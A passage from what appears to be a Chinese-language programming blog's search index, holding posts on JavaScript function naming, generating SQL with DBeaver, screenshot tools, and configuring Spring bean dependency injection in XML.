href=\"https://blog.miniasp.com/post/2011/03/17/Using-JavaScript-debugger-statement-enter-breakpoints\" target=\"_blank\" rel=\"noopener\">善用 JavaScript 的 debugger 指令讓網頁主動進入中斷點 | The Will Will Web</a><br>有空來寫一篇</p>\n<p>var a = function xxx(){</p>\n<p>};</p>\n<p>a 變數是個 function<br>但是 console.log(a.name);<br>會傳出 xxx</p>\n<p>這方便在開發者工具看到哪一個 function 比較吃效能<br>所以閉包也能寫<code>function xxxx()</code></p>\n<p>本篇可能之後還會調整，目前沒有加小標題</p>\n"},{"title":"快速調整 INERT / UPDATE SQL 語法","url":"/blog/2019/12/19/%E5%BF%AB%E9%80%9F%E8%AA%BF%E6%95%B4-INERT-UPDATE-SQL-%E8%AA%9E%E6%B3%95/","content":"<p>最近公司兩台 DB 資料不一致<br>我可以直接使用 Dbeaver 生產 SQL<br>但我發現相關欄位另外一台 DB 沒有<br>移除爛為在 Editor 欄位和數值非常傷眼睛又很花時間</p>\n<a id=\"more\"></a>\n<p>後來發現 Dbeaver 能解決問題</p>\n<h2 id=\"Dbeaver-生產-SQL\"><a href=\"#Dbeaver-生產-SQL\" class=\"headerlink\" title=\"Dbeaver 生產 SQL\"></a>Dbeaver 生產 SQL</h2><p><a href=\"https://github.com/dbeaver/dbeaver/wiki/SQL-Generation\" target=\"_blank\" rel=\"noopener\">SQL Generation · dbeaver/dbeaver Wiki</a></p>\n<p>在查詢可以用以上連結方法生產<br>不過，如何移除不需要的欄位呢?<br>其實我發現用<a href=\"https://github.com/dbeaver/dbeaver/wiki/Data-Filters\" target=\"_blank\" rel=\"noopener\">Data Filters · dbeaver/dbeaver Wiki</a><br>可以移除你不想要的欄位<br>生產 INSERT / UPDATE 語法<br>UPDATE 建議帶入 PK<br>這樣產生 SQL 比較沒問題</p>\n<h2 id=\"手動自己建立-DB\"><a href=\"#手動自己建立-DB\" class=\"headerlink\" title=\"手動自己建立 DB\"></a>手動自己建立 DB</h2><p>首先需要自己 create table(通常會用匯出)<br>INSERT INTO 資料再作刪除欄位<br>匯出 SQL</p>\n<p>目前覺得第一個方法比較實用<br>有想到更好的方法再回來補</p>\n<p>拿到 CSV 資料可以用 <a href=\"https://malagege.github.io/blog/2019/08/21/csv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95/\">csv 快速建立 MySQL 資料表方法 | 程式狂想筆記</a><br><a href=\"https://justnumbersandthings.com/post/2018-06-12-dbeaver-import-csv/\" target=\"_blank\" rel=\"noopener\">Importing a CSV into a database using DBeaver | Just Numbers &amp; Things</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"截圖工具紀錄","url":"/blog/2018/10/30/%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%E7%B4%80%E9%8C%84/","content":"<p>最近朋友問我有甚麼好用截圖工具<br>但我也沒有用過<br>所以找了幾款<br>之後說不定哪天我也會用到</p>\n<a id=\"more\"></a>\n<ul>\n<li><a href=\"https://briian.com/41204/\" target=\"_blank\" rel=\"noopener\">[免費] ImageSplitter 大圖切割/裁剪，圖檔分割工具 – 【重灌狂人】</a></li>\n<li><a href=\"https://briian.com/21451/\" target=\"_blank\" rel=\"noopener\">Trimto v1.4.5.1 快速幫圖片裁切、修改尺寸、存檔…一氣呵成！ – 【重灌狂人】</a></li>\n<li><a href=\"https://www.jianshu.com/p/bbf53b1acc18\" target=\"_blank\" rel=\"noopener\">ImageMagick之图片裁剪详解 - 简书</a></li>\n<li><a href=\"http://www.zuohaotu.com/cut-image.aspx\" target=\"_blank\" rel=\"noopener\">分割图片——免费在线剪切图片成多个小图片</a></li>\n</ul>\n","categories":["實用工具"],"tags":["截圖"]},{"title":"手動配置 XML 注入 Bean 方法","url":"/blog/2020/05/16/%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95/","content":"<p>這邊主要是講手動注入</p>\n<a id=\"more\"></a>\n<h2 id=\"一般-Spring-注入配置文件\"><a href=\"#一般-Spring-注入配置文件\" class=\"headerlink\" title=\"一般 Spring 注入配置文件\"></a>一般 Spring 注入配置文件</h2><p>一般通常都放在 <code>/resource/applicationContext.xml</code></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> <span class=\"attr\">xmlns:context</span>=<span class=\"string\">\"http://www.springframework.org/schema/context\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context/spring-context.xsd\"</span>&gt;</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"一般配置-bean\"><a href=\"#一般配置-bean\" class=\"headerlink\" title=\"一般配置 bean\"></a>一般配置 bean</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> <span class=\"attr\">xmlns:context</span>=<span class=\"string\">\"http://www.springframework.org/schema/context\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context/spring-context.xsd\"</span>&gt;</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>context.getBean(Student.class)</code> 可以順利被載入</p>\n<h2 id=\"載入是同一多個class-的-bean\"><a href=\"#載入是同一多個class-的-bean\" class=\"headerlink\" title=\"載入是同一多個class 的 bean\"></a>載入是同一多個class 的 bean</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>一般 <code>&lt;bean class=&quot;com.xxx.person.Student&quot; /&gt;</code> 沒有定義 id 和 name<br>所以配置出來 Bean 名稱會是 <code>com.xxx.person.Student#0</code><br>第二個就為<code>com.xxx.person.Student#1</code></p>\n<p><strong>這邊跟自動注入出來名稱不一樣(JavaConfig 名稱為 xxxXxxxXxx ex:redCar )</strong></p>\n<p>這時候 Java 呼叫 Bean 是透過 <code>(Student)context.getBean(&quot;com.xxx.person.Student#0&quot;);</code><br>這邊 getBean 使用<strong>字串</strong>記得要強制轉型<br>不然 Java 認不出來</p>\n<p>設為 id or name 如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student2\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>(Student)context.getBean(&quot;student1&quot;)</code></p>\n<h2 id=\"使用-JUnit\"><a href=\"#使用-JUnit\" class=\"headerlink\" title=\"使用 JUnit\"></a>使用 JUnit</h2><p>這邊一樣用兩個<br>@RunWith(SpringJUnit4ClassRunner.class)<br>@ContextConfiguration(“classpath:applicationContext.xml”)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith</span>(SpringJUnit4ClassRunner.class)</span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration</span>(<span class=\"string\">\"classpath:applicationContext.xml\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AppTest</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Student student1;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Student student2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>這邊注意 student1 的對應 bean id  XML 這一行<code>&lt;bean id=&quot;student1&quot; class=&quot;com.xxx.person.Student&quot; /&gt;</code><br>名稱要跟xml 配置一致</p>\n<p><strong>複習自動注入是看 class 名稱(xxxXxxx)</strong></p>\n<h3 id=\"id-和-name-差別\"><a href=\"#id-和-name-差別\" class=\"headerlink\" title=\"id 和 name 差別\"></a>id 和 name 差別</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">name</span>=<span class=\"string\">\"student1_1 student1_2\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">name</span>=<span class=\"string\">\"student2\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.person.Student\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>name 可以多個命名</code>，如上第一行 student1_1 student1_2 可用空白、逗號、加號<br>id 就不行，但也不是說不能這樣寫<code>&lt;bean name=&quot;student1_1 student1_2&quot; class=&quot;com.xxx.person.Student&quot; /&gt;</code><br>只是這邊是指 <code>student1_1 student1_2</code> 是一個名稱<br>所以這邊就沒辦法 @Autowired 方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Autowired</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> Student student1_1 student1_2;</span><br></pre></td></tr></table></figure>\n<p>要這樣使用<code>(Student) context.getBean(&quot;student1_1 student1_2&quot;);</code></p>\n<h2 id=\"建構式注入方法\"><a href=\"#建構式注入方法\" class=\"headerlink\" title=\"建構式注入方法\"></a>建構式注入方法</h2><ol>\n<li><code>&lt;constructor-arg&gt;</code></li>\n<li>c-名稱空間入住(Spring 3.0 引進)</li>\n</ol>\n<h3 id=\"constructor-arg-tag\"><a href=\"#constructor-arg-tag\" class=\"headerlink\" title=\"constructor-arg tag\"></a>constructor-arg tag</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"seat1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Seat\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span>=<span class=\"string\">\"student\"</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這邊的 name 是指 建構式的參數<code>Seat (Student student)</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Seat</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Student st;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Seat</span><span class=\"params\">(Student student)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.st = student;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"細說-可能用不到\"><a href=\"#細說-可能用不到\" class=\"headerlink\" title=\"細說(可能用不到)\"></a>細說(可能用不到)</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- value 可以放值 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span> <span class=\"attr\">value</span> = <span class=\"string\">\"tom\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- null --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">null</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">null</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">type</span>=<span class=\"string\">\"int\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"2001\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">type</span>=<span class=\"string\">\"java.lang.String\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Zara\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- index --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">index</span>=<span class=\"string\">\"0\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"2001\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">index</span>=<span class=\"string\">\"1\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Zara\"</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Spring 3 開始好像才能用建構式的參數<br><a href=\"https://stackoverflow.com/questions/13669798/spring-attribute-name-is-not-allowed-to-appear-in-element-constructor-arg\" target=\"_blank\" rel=\"noopener\">java - Spring - Attribute ‘name’ is not allowed to appear in element ‘constructor-arg’ - Stack Overflow</a><br>在之前版本應該都是用 index 方式</p>\n<blockquote>\n<p>（1）set注入：優點降低了耦合程度，可以按需生成set方法進行傳值；缺點：當需要注入的參數很多時，會有很多的set方法<br>（2）構造方法注入：增加了耦合程度，因為默認的無參的構造方法被覆蓋了；不能按需傳參；<br>sping官方推薦：使用set注入方法<br>參考: <a href=\"https://gist.github.com/xuxiying/3193537\" target=\"_blank\" rel=\"noopener\">Spring學習筆記二：構造方法注入</a></p>\n</blockquote>\n<h3 id=\"C-名稱空間注入\"><a href=\"#C-名稱空間注入\" class=\"headerlink\" title=\"C 名稱空間注入\"></a>C 名稱空間注入</h3><p>先說 c 名稱空間跟 p 名稱空間 沒關係</p>\n<h4 id=\"宣告方法\"><a href=\"#宣告方法\" class=\"headerlink\" title=\"宣告方法\"></a>宣告方法</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> </span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:c</span>=<span class=\"string\">\"http://www.springframework.org/schema/c\"</span></span></span><br></pre></td></tr></table></figure>\n<h4 id=\"建構子注入\"><a href=\"#建構子注入\" class=\"headerlink\" title=\"建構子注入\"></a>建構子注入</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"seat1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Seat\"</span> <span class=\"attr\">c:st-ref</span>=<span class=\"string\">\"student1\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這邊可以換成位置 c:_0-ref=”student1”<br>但我覺得用 name 比較實用</p>\n<p>非 Bean 的值可以用<br>c:_1=”201799777799” c:_2-ref=”notify”</p>\n<h5 id=\"使用名稱注入\"><a href=\"#使用名稱注入\" class=\"headerlink\" title=\"使用名稱注入\"></a>使用名稱注入</h5><p>這邊 bean 是我邊的<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"seat1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.Seat\"</span> <span class=\"attr\">c:teacherName</span>=<span class=\"string\">\"john\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>xml 是區分大小寫的<br><a href=\"https://blog.csdn.net/wang_yunj/article/details/43795269\" target=\"_blank\" rel=\"noopener\">XML解析忽略标签名的大小写<em>java</em>一直在路上-CSDN博客</a></p>\n<h3 id=\"建構式注入集合-collections\"><a href=\"#建構式注入集合-collections\" class=\"headerlink\" title=\"建構式注入集合(collections)\"></a>建構式注入集合(collections)</h3><h4 id=\"list\"><a href=\"#list\" class=\"headerlink\" title=\"list\"></a>list</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--字串--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 1<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- bean --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"Set\"><a href=\"#Set\" class=\"headerlink\" title=\"Set\"></a>Set</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--字串--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 1<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- bean --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">set</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>一般 Set 在 Java 是無序列排序<br>但是在 Spring 使用 LinkedHashSet，所以是有排序的<br>使用 C 名稱無法使用集合(collection)注入</p>\n<h4 id=\"map\"><a href=\"#map\" class=\"headerlink\" title=\"map\"></a>map</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">map</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">entry</span> <span class=\"attr\">key</span>=<span class=\"string\">\"m1\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"value1\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">entry</span> <span class=\"attr\">key</span>=<span class=\"string\">\"m1\"</span> <span class=\"attr\">value-ref</span>=<span class=\"string\">\"&#123;bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">map</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"array\"><a href=\"#array\" class=\"headerlink\" title=\"array\"></a>array</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- string --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 1<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 2<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">value</span>&gt;</span>Hello 3<span class=\"tag\">&lt;/<span class=\"name\">value</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- bean --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">name</span> = <span class=\"string\">\"name\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"&#123;Bean_id&#125;\"</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">bean</span>=<span class=\"string\">\"student1\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">list</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">constructor-arg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用 java 方式<br>String[] student;<br>Student[] student;</p>\n<h2 id=\"屬性-setter-注入\"><a href=\"#屬性-setter-注入\" class=\"headerlink\" title=\"屬性(setter) 注入\"></a>屬性(setter) 注入</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student1\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.student\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"John\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"student2\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.xxx.student\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span 